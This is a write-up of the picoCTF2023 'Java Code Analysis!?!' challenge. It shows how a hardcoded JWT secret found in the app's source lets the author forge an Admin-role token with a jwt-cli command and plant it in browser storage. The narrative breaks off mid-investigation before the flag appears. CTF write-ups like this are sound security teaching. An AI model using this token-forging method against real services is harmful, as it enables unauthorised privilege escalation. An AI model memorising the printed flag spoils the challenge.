# picoCTF2023 Java Code Analysis!?! Write Up

## Description

> BookShelf Pico, my premium online book-reading service. I believe that my website is super secure. I challenge you to prove me wrong by reading the 'Flag' book! Here are the credentials to get you started:
> -  Username: "user"
> - Password: "user"
> Source code can be downloaded [here](https://artifacts.picoctf.net/c/481/bookshelf-pico.zip). Website can be accessed [here!](http://saturn.picoctf.net:52964/).

## Solution

The website initially provides a login interface. Using the default credentials provided in the challenge instance takes us to a search page containing three books:
- The first book requires free privileges
- The second book requires premium privileges
- The third (the flag book, which we are supposed to open) requires admin privileges

The default credentials only give free privileges - the goal of the challenge seems to be getting admin privileges.

The challenge instance also provides access to the source code. After downloading the source code and unzipping it with the command `tar -xvf bookshelf-pico.zip` I began to inspect the source code files. First, I checked the `README.md` file - this contains some basic information about how the website works. Of note is the information about the `security` directory, which contains the core security logic of the program. 

This directory can be found at `src/main/java/io/github/nandandesai/pico/security`. Within this directory is the following files:

```
BookPdfAccessCheck.java
JwtService.java	
ReauthenticationFilter.java
SecretGenerator.java	
SecurityConfig.java	
TokenException.java
UserSecurityDetailsService.java
models
```

Of particular interest is the `JwtService.java` file - this indicates that JWT's are being used for authorisation. This can be verified by analysing the contents of the login request and response:

```http
POST /base/login HTTP/1.1
Host: saturn.picoctf.net:51399
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:129.0) Gecko/20100101 Firefox/129.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Content-Length: 34
Origin: http://saturn.picoctf.net:51399
Connection: close
Referer: http://saturn.picoctf.net:51399/
Priority: u=0

{"email":"user","password":"user"}
```

```http
HTTP/1.1 200 
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY
Content-Type: application/json
Date: Thu, 15 Aug 2024 08:32:28 GMT
Connection: close
Content-Length: 236

{"type":"SUCCESS","payload":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTcyNDMxNTU0OCwiaWF0IjoxNzIzNzEwNzQ4LCJ1c2VySWQiOjEsImVtYWlsIjoidXNlciJ9.fVWqwUVAsk9xVmWJo2qA4ECuRpwuBJdL8OIMIXCVzvM"}
```

The payload in the response is a JWT. Decoding the JWT using https://jwt.io/ shows the tokens payload structure:

```
{
  "role": "Free",
  "iss": "bookshelf",
  "exp": 1724315548,
  "iat": 1723710748,
  "userId": 1,
  "email": "user"
}
```

Ideally I would modify the `"role"` field to something other than `"Free"` to give me a token with administrator privileges, which I could then use to access the flag book. The two main problems preventing me from doing so at this stage are:
- I don't know what the the `"role"` field needs to contain
- I don't know what the secret key used to encrypt the JWT is

The first point is easily addressed - accessing the `src/main/resources` directory, there is a file called `data.sql` which has the following contents:

```sql
INSERT INTO roles VALUES ('Free', 1);
INSERT INTO roles VALUES ('Basic', 2);
INSERT INTO roles VALUES ('Premium', 3);
INSERT INTO roles VALUES ('Admin', 4);
```

Thus we want to set the `"role"` field to `"Admin"`.

The second point is more difficult, and as the title suggests requires inspecting the Java source code. Naturally, the Java files in the security directory are a good starting point.

The `JwtService.java` file contains a `SECRET_KEY` attribute which is used as the secret key when generating and decoding JWTs. It is set according to `secretGenerator.getServerSecret()`, the functionality of which is defined in `SecretGenerator.java`:

```java
@Service
class SecretGenerator {
    private Logger logger = LoggerFactory.getLogger(SecretGenerator.class);
    private static final String SERVER_SECRET_FILENAME = "server_secret.txt";

    @Autowired
    private UserDataPaths userDataPaths;

    private String generateRandomString(int len) {
        // not so random
        return "1234";
    }

    String getServerSecret() {
        try {
            String secret = new String(FileOperation.readFile(userDataPaths.getCurrentJarPath(), SERVER_SECRET_FILENAME), Charset.defaultCharset());
            logger.info("Server secret successfully read from the filesystem. Using the same for this runtime.");
            return secret;
        }catch (IOException e){
            logger.info(SERVER_SECRET_FILENAME+" file doesn't exists or something went wrong in reading that file. Generating a new secret for the server.");
            String newSecret = generateRandomString(32);
            try {
                FileOperation.writeFile(userDataPaths.getCurrentJarPath(), SERVER_SECRET_FILENAME, newSecret.getBytes());
            } catch (IOException ex) {
                ex.printStackTrace();
            }
            logger.info("Newly generated secret is now written to the filesystem for persistence.");
            return newSecret;
        }
    }
}
```

 We can see that the secret key is read from the file `server_secret.txt` if the file exists, otherwise the file is created and populated with the contents of `generateRandomString()`. Interestingly, the string returned from this function is not random at all - it is set to `"1234"`. Operating on the assumption that no `server_secret.txt` file exists upon launching the challenge instance, this means the JWT secret key is `"1234"`.

With these pieces of information, I can create my own JWT. I used the [JWT cli tool](https://github.com/mike-engel/jwt-cli) from Mike Engel for this purpose. I ran the following command:

```
jwt encode --secret "1234" '{"role":"Admin","iss":"bookshelf","exp":1724315548,"iat":1723710748,"userId":1,"email":"user"}'
```

Which produced the following JWT:

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJlbWFpbCI6InVzZXIiLCJleHAiOjE3MjQzMTU1NDgsImlhdCI6MTcyMzcxMDc0OCwiaXNzIjoiYm9va3NoZWxmIiwicm9sZSI6IkFkbWluIiwidXNlcklkIjoxfQ.gWkil-rszTDV6KD4JB9tY01hzRGhiQ48hjs8WYfKEOk
```

Opening the developer console and looking at the storage section, I observed that the JWT is being stored in the local storage section:

![[Screenshot 2024-08-15 at 8.50.06 pm.png]]

I set the `auth-token` field to the JWT above and the `token-payload` field to the value:

```
{"role":"Admin","iss":"bookshelf","exp":1724315548,"iat":1723710748,"userId":1,"email":"user"}
```

After refreshing the page, the icon at the top right of the screen indicates that I have admin privileges! However attempting to access the flag book is unsuccessful. Looking at the HTTP response from attempting to access the book shows an error:

```http
HTTP/1.1 403 
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY
Content-Type: application/json
Date: Thu, 15 Aug 2024 10:47:32 GMT
Connection: close
Content-Length: 149

{"type":"UNAUTHORIZED","payload":{"message":"You are trying to access a resource but you don't have the permission.","details":["Access is denied"]}}
```

At this stage I turned back to the source code to find any other information to indicate why my JWT may not be working. To this end, I recursively searched the `pico` directory for the contents of `"message"` described above with the command:

```
grep -r "You are trying to access"
```

Which produces a match on the `exceptions/CommonExceptionHandler.java` file. This error message comes from an exception handler called `accessDeniedExceptions()` containing an exception of type `AccessDeniedException`. Again I recursively searched for the `AccessDeniedException`


Flag:
picoCTF{w34k_jwt_n0t_g00d_ca4d9701}